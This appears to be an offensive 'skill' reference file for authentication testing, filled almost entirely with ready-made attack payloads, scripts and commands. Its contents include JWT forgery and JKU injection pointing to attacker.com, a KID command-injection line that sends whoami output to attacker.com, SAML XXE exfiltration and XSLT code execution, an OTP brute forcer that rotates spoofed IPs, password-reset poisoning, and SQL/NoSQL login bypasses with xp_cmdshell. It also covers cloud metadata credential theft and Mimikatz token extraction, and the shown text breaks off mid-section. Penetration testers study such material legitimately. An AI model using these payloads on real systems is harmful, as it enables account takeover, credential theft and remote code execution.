---
name: auth
description: Comprehensive authentication security testing skill covering JWT attacks (alg:none, key confusion, KID/JKU injection), OAuth/OIDC exploitation, SAML XML injection (XSW1-8, XXE, XSLT), MFA bypass, session attacks, password reset poisoning, account enumeration timing attacks, cloud IAM (AWS/Azure/GCP), race conditions, framework middleware bypasses, and API key discovery with specific payloads and tool commands.
sources: hackerone_public, owasp, portswigger, bug_bounty_reports, cve_database
---

# Authentication Security Testing

## Quick Reference — Attack Decision Tree

```
Target has JWT?       → Section: JWT Attacks
OAuth/OIDC flow?      → Section: OAuth Attacks
SAML SSO?             → Section: SAML Attacks
MFA enforced?         → Section: MFA Bypass
Password reset flow?  → Section: Password Reset
Login endpoint?       → Section: Account Enumeration + SQL/NoSQL Injection
Cloud environment?    → Section: Cloud IAM Attacks
Modern framework?     → Section: Framework Middleware Bypass
GraphQL API?          → Section: GraphQL/gRPC/WebSocket Auth
CI/CD pipelines?      → Section: CI/CD OIDC Token Abuse
```

---

## Phase 1: Reconnaissance

### Auth Endpoint Discovery
```bash
# Directory brute-force for auth paths
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 404

# Key paths to probe manually
/login /signin /auth /authenticate /api/login /api/auth /api/v1/auth
/oauth /oauth2 /oauth/authorize /oauth/token
/saml /saml/metadata /saml/acs /saml/slo
/sso /adfs /FederationMetadata/2007-06/FederationMetadata.xml
/register /signup /create-account
/forgot-password /reset-password /password/reset
/2fa /mfa /otp /verify /verify-email
/.well-known/openid-configuration
/.well-known/oauth-authorization-server
```

### Technology Fingerprinting
```bash
curl -I https://target.com | grep -i "server\|x-powered-by\|x-aspnet"
curl -s https://target.com/login | grep -i "csrf\|token\|framework"
whatweb https://target.com
```

### Secret Scanning
```bash
# Git history
trufflehog git https://github.com/target/repo --only-verified
gitleaks detect -v

# Filesystem patterns
grep -r "AKIA" .                        # AWS Access Key ID
grep -r "aws_secret_access_key" .
grep -r "sk-ant-" .                     # Anthropic API key
grep -r "ghp_\|gho_\|ghu_\|ghs_" .    # GitHub tokens
grep -r "sk_live_\|sk_test_" .         # Stripe
grep -r "xoxb-\|xoxp-" .              # Slack
```

### Sensitive File Paths
```
.env  .env.local  .env.production  .env.backup
.aws/credentials  .aws/config
terraform.tfvars  terraform.tfstate
config/database.yml  config/secrets.yml
.git/config  .gitconfig
wp-config.php  configuration.php  settings.py
/etc/passwd  /etc/shadow  /proc/self/environ
```

### API Key Regex Patterns
```
AWS:          AKIA[A-Z0-9]{16}  ASIA[A-Z0-9]{16}
Google:       AIza[0-9A-Za-z\-_]{35}
GitHub:       ghp_[0-9a-zA-Z]{36}  gho_  ghu_  ghs_  ghr_
GitLab:       glpat-[0-9a-zA-Z\-_]{20}
Slack:        xox[bpsar]-[0-9]{11}-[0-9]{11}-[a-zA-Z0-9]{24}
Stripe:       sk_live_[0-9a-zA-Z]{24}  sk_test_  pk_live_  rk_live_
OpenAI:       sk-[a-zA-Z0-9]{48}
SendGrid:     SG\.[a-zA-Z0-9_\-\.]{22}\.[a-zA-Z0-9_\-\.]{43}
HuggingFace:  hf_[a-zA-Z0-9]{39}
DigitalOcean: dop_v1_[a-f0-9]{64}
Shopify:      shpat_[a-fA-F0-9]{32}
Anthropic:    sk-ant-[a-zA-Z0-9\-_]{93}
npm:          npm_[A-Za-z0-9]{36}
PyPI:         pypi-[A-Za-z0-9\-_]{50,100}
```

---

## JWT Attacks

### jwt_tool Quick Reference
```bash
# Install
pip3 install jwt-tool
# OR: git clone https://github.com/ticarpi/jwt_tool && pip3 install -r requirements.txt

jwt_tool <TOKEN>                        # Decode and check
jwt_tool <TOKEN> -X a                  # Test all algorithm attacks
jwt_tool <TOKEN> -X n                  # alg:none attack
jwt_tool <TOKEN> -X k -pk public.pem  # Key confusion RS256 to HS256
jwt_tool <TOKEN> -C -d wordlist.txt    # Crack HMAC secret
jwt_tool <TOKEN> -I -pc role -pv admin # Inject claim (role=admin)
jwt_tool <TOKEN> -I -pc sub -pv 1      # Inject sub=1
jwt_tool <TOKEN> -I -hc kid -hv "../../dev/null" -S hs256 -p ""  # KID path traversal
jwt_tool <TOKEN> -ju https://attacker.com/jwks.json  # JKU injection
```

### alg:none Attack
The server accepts tokens with algorithm set to "none" and an empty/absent signature.
```python
import base64, json

def create_none_token(payload_dict):
    header = {"alg": "none", "typ": "JWT"}
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
    p = base64.urlsafe_b64encode(json.dumps(payload_dict).encode()).rstrip(b'=').decode()
    return f"{h}.{p}."     # Trailing dot = empty signature

# Capitalize variations to bypass case-sensitive checks
none_variants = ["none", "None", "NONE", "nOnE", "noNe", "NonE"]
```

### RS256 to HS256 Key Confusion
If the server uses RS256 but also supports HS256, sign the token with the RSA public key as the HMAC secret:
```python
import jwt, requests

# Fetch the public key
jwks = requests.get("https://target.com/.well-known/jwks.json").json()
# Convert JWK to PEM, store as pubkey_pem

forged = jwt.encode(
    {"sub": "admin", "role": "admin"},
    pubkey_pem,
    algorithm="HS256"
)
# jwt_tool equivalent:
# jwt_tool <TOKEN> -X k -pk public.pem
```

### JKU/X5U Injection
Inject a URL pointing to attacker-controlled JWKS:
```
# Header injection payloads
{"jku": "https://attacker.com/.well-known/jwks.json"}
{"jku": "https://target.com@attacker.com/jwks.json"}
{"jku": "https://target.com/.well-known/jwks.json/../../../attacker.com/jwks.json"}
{"jku": "https://target.com%40attacker.com/.well-known/jwks.json"}
{"jku": "https://attacker.com#.target.com/.well-known/jwks.json"}
{"jku": "https://target.com\\@attacker.com/jwks.json"}
{"jku": "https://attacker.com/jwks.json?.target.com"}
{"x5u": "https://attacker.com/cert.pem"}
{"x5u": "https://target.com@attacker.com/cert.pem"}
```

Attacker JWKS server response (host at jku URL):
```json
{"keys": [{"kty": "RSA", "kid": "attacker-key", "n": "<attacker_modulus>", "e": "AQAB"}]}
```

### Embedded JWK (jwk Header Injection)
```
{"jwk": {"kty": "RSA", "n": "ATTACKER_MODULUS", "e": "AQAB"}}
{"jwk": {"kty": "EC", "crv": "P-256", "x": "ATTACKER_X", "y": "ATTACKER_Y"}}
```
Use Burp Suite JWT Editor plugin: "Embedded JWK" button generates key pair and embeds public key in header.

### KID Injection Payloads
```
# Path traversal to empty key (sign with empty string)
../../../../../../dev/null
../../../../../../../dev/null
/dev/null
/proc/self/environ

# SQL injection in KID (sign with the injected value)
' UNION SELECT 'ATTACKER_KEY' --
" UNION SELECT "ATTACKER_KEY" --
' OR '1'='1
1' UNION SELECT x'41414141' --
' UNION ALL SELECT 'HMAC_KEY_HERE'-- -

# Command injection
| cat /etc/passwd
; cat /etc/passwd
`cat /etc/passwd`
$(cat /etc/passwd)
; curl attacker.com/$(whoami)

# LDAP injection
*)(uid=*))(|(uid=*
admin)(|(password=*

# Template injection
{{7*7}}
${7*7}
#{7*7}
<%= 7*7 %>

# Null byte
key_id%00.pem
../../etc/passwd%00
```

### CVE-2022-21449 — ECDSA Blank Signature (Java 15-18)
Java's ECDSA implementation accepted signatures of all zeros. Any JWT with ES256/ES384/ES512 on affected Java versions accepts a blank signature:
```python
# Blank ECDSA signature (DER-encoded zeroes, base64url)
blank_sig = "MAYCAQACAQAC"  # For ES256; adjust length for ES384/ES512
forged_token = f"{header_b64}.{payload_b64}.{blank_sig}"
```

### JWT Payload Claim Tampering
```
# Role escalation
{"role": "admin"}  {"role": "superadmin"}  {"roles": ["admin"]}
{"permissions": ["*"]}  {"groups": ["administrators"]}
{"is_admin": true}  {"privilege_level": 9999}
{"scope": "admin:full"}

# Subject manipulation
sub: admin, root, 0, 1, -1, null, system

# Expiration bypass
exp: 4102444800  (year 2099)
exp: 0  or  -1  or  omitted entirely
exp: "never"  (string to trigger type error)

# Issuer confusion
iss: https://attacker.com
iss: https://accounts.google.com
iss: https://login.microsoftonline.com/common
iss: null  or  *
```

### Weak Secret Brute Force
```bash
# Hashcat
hashcat -a 0 -m 16500 token.txt /usr/share/wordlists/rockyou.txt

# John the Ripper
john --wordlist=wordlist.txt --format=HMAC-SHA256 token.txt

# jwt_tool
jwt_tool <TOKEN> -C -d jwt-secrets.txt
```

**Common weak secrets:**
```
secret  password  123456  key  private  hmac-secret  jwt-secret
signing-key  default  test  development  changeme  admin  null
undefined  empty  your-256-bit-secret  HS256-secret  auth-secret
app-secret  my-secret  super-secret  jwt_secret_key  token-secret
SECRET_KEY  s3cr3t  p@ssw0rd  qwerty  letmein
# Framework defaults:
express-session-secret  connect.sid  DJANGO_SECRET_KEY
APP_SECRET  RAILS_SECRET  SPRING_JWT_SECRET
Laravel_JWT_Secret  Flask_Secret_Key
# Env variable name patterns (try literal string):
JWT_SECRET  JWT_KEY  TOKEN_SECRET  API_SECRET  AUTH_SECRET
SECRET_KEY  PRIVATE_KEY  SIGNING_KEY  SESSION_SECRET
# UUID patterns
550e8400-e29b-41d4-a716-446655440000
00000000-0000-0000-0000-000000000000
```

---

## OAuth 2.0 Attacks

### redirect_uri Bypass Payloads
```
# Direct substitution
https://attacker.com/callback

# Subdomain manipulation (target.com is whitelisted)
https://attacker.target.com/callback
https://target.com.attacker.com/callback

# Path traversal
https://target.com/callback/../../../attacker
https://target.com/callback/..;/attacker
https://target.com/callback/..%2fattacker
https://target.com/callback/..%252fattacker

# Authority confusion
https://target.com@attacker.com/callback
https://attacker.com@target.com/callback
https://target.com%40attacker.com/callback
https://attacker.com:443@target.com/callback

# Fragment injection
https://target.com/callback#https://attacker.com
https://target.com/callback%23attacker.com

# Parser differentials
https://target.com/callback\..\..\..\attacker
https://target.com/callback//attacker
https://target.com/callback%00.attacker.com
https://target.com/callback%09attacker
https://target.com/callback%0aattacker

# Non-HTTP schemes (if any scheme accepted)
javascript:alert(document.domain)//
data:text/html,<script>alert(1)</script>
file:///etc/passwd

# IP variations for localhost bypass
https://127.0.0.1/callback
https://2130706433/callback     # Decimal 127.0.0.1
https://0x7f000001/callback     # Hex
https://017700000001/callback   # Octal
https://[::1]/callback
https://[::ffff:127.0.0.1]/callback

# Wildcard bypass (if *.target.com allowed)
https://attacker.com?.target.com/callback
https://attacker.com#.target.com/callback
https://attacker.com%23.target.com/callback
```

### State Parameter (CSRF)
```bash
# Missing state = CSRF on OAuth flow
GET /oauth/authorize?client_id=app&redirect_uri=https://app.com/callback&response_type=code
# (no state parameter)

# Predictable state values
state=1  state=abc  state=123  state=test  state=static_state_value
state=00000000-0000-0000-0000-000000000000
```

### PKCE Bypass
```bash
# Try exchanging code without code_verifier
POST /oauth/token
grant_type=authorization_code&code=AUTHCODE&client_id=app&redirect_uri=https://app.com/callback
# Should fail if PKCE enforced; if succeeds PKCE not verified

# code_challenge_method confusion
code_challenge_method=plain  (downgrade from S256)
# Try omitting code_challenge entirely
```

### Authorization Code Replay
```bash
curl -X POST https://target.com/oauth/token \
  -d "grant_type=authorization_code&code=USED_CODE&client_id=app&redirect_uri=https://app.com/callback"
# If returns new token = code not invalidated after first use
```

### Scope Escalation
```
# Request elevated scopes
scope=admin  scope=read write admin  scope=admin:full  scope=*
scope=manage:all  scope=superuser  scope=offline_access openid profile email admin:org
```

### Token Type Confusion
```
# Use refresh token as access token
# Use ID token as access token
# Use authorization code as bearer token

# Token exchange (RFC 8693)
POST /oauth/token
grant_type=urn:ietf:params:oauth:grant-type:token-exchange
&subject_token=VICTIM_TOKEN
&subject_token_type=urn:ietf:params:oauth:token-type:access_token
&requested_token_type=urn:ietf:params:oauth:token-type:access_token
```

---

## SAML Attacks

### XML Signature Wrapping (XSW) Attacks
XSW moves a valid signature so it covers a benign element while injecting an unsigned malicious assertion the SP processes.

**XSW1 — Wrapper in Response root:**
```xml
<samlp:Response>
  <saml:Assertion ID="attacker_assertion">
    <saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject>
    <saml:AttributeStatement>
      <saml:Attribute Name="Role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
  <saml:Assertion ID="legitimate">
    <ds:Signature>... original valid signature ...</ds:Signature>
    <saml:Subject><saml:NameID>user@target.com</saml:NameID></saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

**XSW2 — Detached signature:**
```xml
<samlp:Response>
  <ds:Signature>... valid signature over #legitimate ...</ds:Signature>
  <saml:Assertion ID="attacker_assertion">
    <saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject>
  </saml:Assertion>
  <saml:Assertion ID="legitimate">
    <saml:Subject><saml:NameID>user@target.com</saml:NameID></saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

**Comment injection (parser differential):**
```xml
<saml:NameID>victim@target.com<!---->.evil.com</saml:NameID>
<!-- Some parsers strip comments = victim@target.com; others include = victim@target.com.evil.com -->
```

### SAML XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response>
  <saml:NameID>&xxe;</saml:NameID>
</samlp:Response>

<!-- SSRF to cloud metadata -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>

<!-- GCP metadata -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]>

<!-- OOB exfiltration -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
```

### SAML XSLT Injection (Java RCE)
```xml
<ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">
  <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
      xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" extension-element-prefixes="rt">
    <xsl:template match="/">
      <xsl:variable name="rtObj" select="rt:getRuntime()"/>
      <xsl:variable name="process" select="rt:exec($rtObj,'id')"/>
      <xsl:value-of select="$process"/>
    </xsl:template>
  </xsl:stylesheet>
</ds:Transform>
```

### SAML Assertion Manipulation
```xml
<!-- NameID escalation -->
<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">admin@target.com</saml:NameID>

<!-- Role injection -->
<saml:AttributeStatement>
  <saml:Attribute Name="Role">
    <saml:AttributeValue>admin</saml:AttributeValue>
  </saml:Attribute>
</saml:AttributeStatement>

<!-- Extend validity -->
<saml:Conditions NotBefore="1970-01-01T00:00:00Z" NotOnOrAfter="2099-12-31T23:59:59Z">
  <saml:AudienceRestriction>
    <saml:Audience>*</saml:Audience>
  </saml:AudienceRestriction>
</saml:Conditions>
```

### SAML Billion Laughs DoS
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<samlp:Response><saml:Assertion>&lol4;</saml:Assertion></samlp:Response>
```

### SAML Tools
```bash
# SAML Raider (Burp plugin): right-click to Extensions to SAML Raider to Send to SAML Raider
# Operations: Remove Signature, XSW1-8, XXE, Clone Certificate

# SAMLTool online decoder: samltool.com

# Generate self-signed cert for SAML testing
openssl req -x509 -newkey rsa:4096 -keyout saml_key.pem -out saml_cert.pem -days 365 -nodes
```

---

## MFA Bypass Techniques

### Direct Endpoint Access After Partial Authentication
After password auth but before MFA verification, attempt:
```
GET /dashboard          GET /home            GET /account
GET /profile            GET /settings        GET /admin
GET /api/user           GET /api/me           GET /api/profile
GET /api/v1/user        GET /api/v1/me        GET /portal
GET /main               GET /app              GET /console
```

### Step Parameter Manipulation
```json
{"step": "complete", "mfa_verified": "true"}
{"auth_state": "authenticated", "mfa_required": "false"}
{"skip_2fa": "true"}
{"authentication_level": "full"}
{"mfa_complete": true}
{"auth_step": "complete"}
{"auth_level": 2}
{"2fa_state": "verified"}
{"verification_complete": true}
```

### Response Manipulation (Burp Match/Replace)
```
"mfa_verified":false  to  "mfa_verified":true
"success":false       to  "success":true
"valid":false         to  "valid":true
"mfa_required":true   to  "mfa_required":false
"2fa_required":true   to  "2fa_required":false
"authenticated":false to  "authenticated":true
"status":"pending"    to  "status":"verified"
HTTP 401              to  HTTP 200
HTTP 403              to  HTTP 200
```

### Bypass Headers
```
X-MFA-Verified: true          X-MFA-Verified: 1
X-2FA-Bypass: true            X-2FA-Verified: true
X-Auth-Skip: true             X-OTP-Verified: true
X-Verification-Skip: true     X-MFA-Token: valid
X-MFA-Status: verified        MFA-Verified: true
2FA-Status: complete
```

### OTP Brute Force Payloads
```
# Common 6-digit OTPs
000000  111111  123456  123123  654321  999999
100000  200000  112233  121212  131313  696969  777777  888888

# Common 4-digit OTPs
0000  1111  1234  4321  9999  0123  1212  6969

# Null/empty bypass
otp=  otp=null  otp=NULL  otp=undefined  otp=nil  otp=0  otp=false
{"otp": null}  {"otp": ""}  {"otp": 0}  {"otp": false}

# Array injection (PHP)
otp[]=123456  otp[]=  otp[0]=123456

# NoSQL injection
{"otp":{"$ne":""}}  {"otp":{"$gt":""}}  {"otp":{"$regex":".*"}}
otp={"$ne":""}  otp={"$regex":".*"}

# JSON parameter pollution
{"otp":"wrong","otp":"correct"}
```

### Rate Limit Bypass
```
# IP rotation headers (change per request)
X-Forwarded-For: 192.168.1.RAND
X-Real-IP: 10.0.0.RAND
X-Originating-IP: 172.16.0.RAND
True-Client-IP: RAND
Client-IP: RAND
CF-Connecting-IP: RAND
Forwarded: for=RAND

# Endpoint variations
/verify to /Verify  /verify/ to /VERIFY to /verify?
/api/verify to /api//verify  /api/./verify

# Parameter encoding
otp=123456%00  otp=%31%32%33%34%35%36  otp=123456%0a
```

### Python OTP Brute Forcer
```python
import requests, threading

class OTPBruteForcer:
    def __init__(self, url, session_cookie, otp_param="otp"):
        self.url = url
        self.cookie = session_cookie
        self.param = otp_param
        self.found = None

    def try_otp(self, code, ip_last):
        if self.found:
            return
        headers = {"X-Forwarded-For": f"10.0.0.{ip_last}"}
        r = requests.post(self.url,
            json={self.param: str(code).zfill(6)},
            cookies={"session": self.cookie},
            headers=headers)
        if r.status_code == 200 and "error" not in r.text.lower():
            self.found = str(code).zfill(6)
            print(f"[+] OTP found: {self.found}")
```

### OTP Timing Attack (Digit-by-Digit)
```python
import requests, time, statistics

class OTPTimingAttack:
    def __init__(self, url, session_cookie):
        self.url = url
        self.cookie = session_cookie

    def measure(self, otp, samples=20):
        times = []
        for _ in range(samples):
            start = time.perf_counter()
            requests.post(self.url, json={"otp": otp},
                         cookies={"session": self.cookie})
            times.append(time.perf_counter() - start)
        return statistics.mean(times)

    def find_first_digit(self):
        timings = {}
        for d in range(10):
            otp = str(d) + "00000"
            timings[d] = self.measure(otp)
        return max(timings, key=timings.get)  # Longest = correct digit
```

### Account Pre-Hijacking Classes
```
Class 1: Classic-Federated Merge
  Register victim@target.com before victim does.
  When victim authenticates via OAuth/SSO, accounts merge.
  Attacker retains existing session.

Class 2: Unexpired Session
  Register, get session cookie, do not log out.
  Victim resets password on same account.
  Attacker's old session remains valid.

Class 3: Trojan Identifier
  Create account, add attacker email as secondary.
  When victim registers same primary email, attacker retains access.

Class 4: Non-Verifying IdP
  Register at IdP with victim email (no email verification).
  SSO into target using that IdP identity.

Class 5: Email Change Race
  Create account, initiate email change to victim email.
  Do not complete verification; wait for victim to register.
```

---

## Password Reset Attacks

### Host Header Injection
```bash
# Basic injection
curl -X POST https://target.com/api/forgot-password \
  -H "Host: attacker.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}'
# Reset link sent: https://attacker.com/reset?token=xxx

# Advanced: X-Forwarded-Host override
curl -X POST https://target.com/api/forgot-password \
  -H "X-Forwarded-Host: attacker.com" \
  -d '{"email":"victim@example.com"}'

# Other host-related headers to try
X-Original-Host: attacker.com
X-Host: attacker.com
Forwarded: host=attacker.com
X-Forwarded-Server: attacker.com
```

### Email Parameter Manipulation
```
# Multiple emails
{"email": ["victim@example.com", "attacker@evil.com"]}
{"email": "victim@example.com,attacker@evil.com"}

# CRLF injection (CC/BCC)
{"email": "victim@example.com\ncc:attacker@evil.com"}
{"email": "victim@example.com\r\nBcc: attacker@evil.com"}
{"email": "victim@example.com\nX-Injected: true"}

# Unicode normalization
{"email": "victim@example.com attacker@evil.com"}

# HTTP Parameter Pollution
email=victim@example.com&email=attacker@evil.com
```

### Token Vulnerability Detection
```python
import math
from collections import Counter

def analyze_token_pattern(tokens):
    # Sequential check
    try:
        ints = [int(t, 16) for t in tokens]
        diffs = set(ints[i+1] - ints[i] for i in range(len(ints)-1))
        if len(diffs) == 1:
            return f"SEQUENTIAL: increment={diffs.pop()}"
    except: pass

    # Timestamp embedded check
    for t in tokens:
        for i in range(len(t)-9):
            sub = t[i:i+10]
            if sub.isdigit() and 1600000000 < int(sub) < 2000000000:
                return f"TIMESTAMP_EMBEDDED at position {i}"

    # Entropy
    for t in tokens:
        freq = Counter(t)
        entropy = -sum((c/len(t))*math.log2(c/len(t)) for c in freq.values())
        if entropy < 3.0:
            return f"LOW_ENTROPY: {entropy:.2f}"
    return "HIGH_ENTROPY (likely secure)"
```

### Race Condition on Reset Token
```python
# Turbo Intruder script: submit same reset token simultaneously
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=20, engine=Engine.HTTP2)
    for i in range(20):
        engine.queue(target.req, None, gate='race')
    engine.openGate('race')

# Python equivalent
import threading, requests
def race_reset(url, token, passwords):
    def attempt(pwd):
        requests.post(url, json={"token": token, "password": pwd})
    threads = [threading.Thread(target=attempt, args=(p,)) for p in passwords]
    for t in threads: t.start()
    for t in threads: t.join()
```

---

## Account Enumeration

### Response-Based Enumeration Vectors
```
# Login endpoint
POST /api/login  username=admin, password=wrong
"Invalid password"   = ENUMERATION (user exists)
"User not found"     = ENUMERATION (no such user)
"Invalid credentials" = Secure (same message both)

# Registration endpoint
POST /api/register  email=existing@example.com
"Email already registered" = ENUMERATION

# Password reset
POST /api/forgot-password  email=existing@example.com
"Reset link sent"  vs  "Email not found" = ENUMERATION
```

### Timing-Based Enumeration
```python
import requests, time, statistics

class TimingEnumerator:
    def __init__(self, url):
        self.url = url

    def measure(self, username, samples=50):
        times = []
        for _ in range(samples):
            start = time.perf_counter()
            requests.post(self.url, json={"username": username, "password": "WRONG_PASS_XYZ"})
            times.append(time.perf_counter() - start)
        return statistics.mean(times), statistics.stdev(times)

    def enumerate(self, candidates):
        results = {}
        for user in candidates:
            avg, std = self.measure(user)
            results[user] = {"avg_ms": avg*1000, "std_ms": std*1000}
        # Valid users: longer avg (bcrypt/argon2 runs); invalid: quick fail
        return sorted(results.items(), key=lambda x: x[1]["avg_ms"], reverse=True)
```

---

## SQL Injection in Authentication

### Login Form Payloads
```
# Classic OR bypass
' OR '1'='1' --
' OR '1'='1' #
' OR 1=1 --
admin'--
admin' #

# Admin-specific
' OR 'x'='x
') OR ('x'='x
' OR 1=1 LIMIT 1 --

# PostgreSQL
' OR 1=1 --

# Oracle
' OR '1'='1' FROM dual --

# MSSQL
'; EXEC xp_cmdshell('whoami') --

# Time-based blind (enumerate users)
' OR SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
```

### NoSQL Injection (MongoDB)
```
# Query operator bypass
username=admin&password[$ne]=wrongpassword
username[$in][]=admin&password[$ne]=x
{"username": "admin", "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$ne": ""}}

# JavaScript injection
{"username": "admin", "password": {"$where": "1==1"}}
```

### LDAP Injection
```
username=*)(uid=*))(|(uid=*&password=anything
username=admin)(|(password=*)&password=anything
username=*&password=*
```

### PHP Type Juggling
```
# Magic hash bypass (== comparison with 0e leading)
240610708  (MD5 starts with 0e)
QNKCDZO    (MD5: 0e830400451993494058024219903391)
aabg74k3   (MD5: 0e944028996250888958808415012132)

# Boolean coercion
password=true  password=1  password[]=

# Array bypass
username[]=admin&password[]=pass
```

---

## Session Attacks

### Session Fixation
```http
# Step 1: Set attacker-controlled session before auth
GET /login HTTP/1.1
Cookie: session=ATTACKER_SESSION

# Step 2: Victim authenticates - check if session ID changed
POST /login HTTP/1.1
Cookie: session=ATTACKER_SESSION
username=victim&password=pass

# VULNERABLE if /dashboard is accessible with ATTACKER_SESSION
```

### Cookie Security Analysis
```
# Required attributes on session cookies
Secure        = only sent over HTTPS
HttpOnly      = no JS access (XSS protection)
SameSite=Strict/Lax = CSRF protection
Path=/        = scoped correctly
Max-Age/Expires = defined lifetime

# Test for missing attributes
curl -I https://target.com/login | grep -i "set-cookie"
```

---

## HTTP Header & Path Bypass Attacks

### IP Spoofing Headers
```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Client-IP: 127.0.0.1
X-ProxyUser-IP: 127.0.0.1
X-Original-IP: 127.0.0.1
```

### HTTP Verb Tampering
```
# Admin endpoint only blocks POST - try GET/PUT/PATCH/HEAD/OPTIONS
GET /admin/delete-user?id=1
PUT /api/admin/users/1

# Method override headers
X-HTTP-Method-Override: DELETE
X-HTTP-Method: PUT
X-Method-Override: PATCH
_method=DELETE  (form parameter)
```

### Path Traversal / Normalization Bypass
```
# Case variation
/Admin  /ADMIN  /aDmIn

# Trailing characters
/admin/  /admin.  /admin;  /admin?

# Double dots
/api/..;/admin
/api/../admin
/api/v1/../../admin

# URL encoding
/admin%2f  /%61dmin  /admin%2e

# Double encoding
/%2561dmin  /%252fadmin

# Unicode
/admin

# Extension confusion
/admin.json  /admin.xml  /admin.php
```

---

## Framework Middleware Bypass

### Next.js — CVE-2025-29927 (x-middleware-subrequest)
```bash
# Bypass middleware auth by setting the header to skip middleware
curl -H "x-middleware-subrequest: middleware" https://target.com/admin
curl -H "x-middleware-subrequest: src/middleware" https://target.com/admin
curl -H "x-middleware-subrequest: middleware:middleware:middleware" https://target.com/admin
curl -H "x-middleware-subrequest: 1" https://target.com/admin

# Full list of values to try
x-middleware-subrequest: middleware
x-middleware-subrequest: src/middleware
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
x-middleware-subrequest: 1
x-middleware-subrequest: true
x-middleware-subrequest: 1:1:1:1:1
x-middleware-subrequest: pages/admin
x-middleware-subrequest: app/admin
x-middleware-subrequest: src/pages/admin
x-middleware-subrequest: src/app/admin
x-middleware-subrequest: middleware.js
x-middleware-subrequest: src/middleware.js

# Data route bypass
curl https://target.com/_next/data/BUILD_ID/admin.json
```

### Nuxt.js / SvelteKit / Remix Data Leaks
```bash
# Nuxt.js payload JSON accessible on protected routes
curl https://target.com/admin/_payload.json
curl https://target.com/dashboard/_payload.json

# SvelteKit data endpoint
curl https://target.com/admin/__data.json
curl https://target.com/settings/__data.json

# Remix loader data param
curl "https://target.com/admin?_data=routes/admin"
curl "https://target.com/dashboard?_data=routes/dashboard"
```

### Spring Security Path Bypass
```bash
# Semicolon bypass (matrix parameters)
curl https://target.com/admin;bypass=true
curl https://target.com/admin;.css
curl https://target.com/admin;jsessionid=FAKE

# Double dot bypass
curl https://target.com/api/..;/admin
curl https://target.com/static/../admin

# Encoding bypass
curl "https://target.com/admin%3b"
curl "https://target.com/admin%252f"
curl "https://target.com/%61dmin"

# Spring Actuator (often not properly restricted)
curl https://target.com/actuator/env
curl https://target.com/actuator/heapdump
curl https://target.com/actuator/configprops
```

### Express Prototype Pollution
```json
{"__proto__": {"admin": true}}
{"constructor": {"prototype": {"admin": true}}}
{"__proto__": {"isAuthenticated": true}}
{"__proto__": {"role": "admin"}}
```

---

## Cloud IAM Attacks

### AWS

**IMDSv1 SSRF (via SSRF vuln in app):**
```bash
# 1. Get IAM role name
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 2. Get credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# IMDSv2 (requires token)
TOKEN=$(curl -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ -H "X-aws-ec2-metadata-token: $TOKEN"

# EC2 user data (may contain credentials)
curl http://169.254.169.254/latest/user-data/
```

**Confused Deputy (missing ExternalId):**
```json
{
  "Effect": "Allow",
  "Principal": {"Service": "lambda.amazonaws.com"},
  "Action": "sts:AssumeRole"
}
```

**Permission Enumeration:**
```bash
aws sts get-caller-identity
aws iam list-users
aws iam list-roles
aws iam list-attached-user-policies --user-name USERNAME
pacu
```

**AWS Cognito Misconfiguration:**
```bash
# Self-registration on private pool
aws cognito-idp sign-up \
  --client-id POOL_CLIENT_ID \
  --username attacker@evil.com \
  --password AttackerPass123! \
  --user-attributes Name=email,Value=attacker@evil.com

# Unauthenticated identity pool access
aws cognito-identity get-id \
  --identity-pool-id us-east-1:POOL_ID
aws cognito-identity get-credentials-for-identity \
  --identity-id us-east-1:IDENTITY_ID

# Custom attribute escalation
aws cognito-idp update-user-attributes \
  --access-token USER_TOKEN \
  --user-attributes Name=custom:role,Value=admin
```

### Azure

**Azure Managed Identity Token:**
```bash
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' \
  -H 'Metadata: true'
```

**PRT Token Extraction (Mimikatz):**
```
privilege::debug
sekurlsa::cloudap
```

### GCP

**GCP Metadata Server:**
```bash
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"
```

**Service Account Impersonation:**
```bash
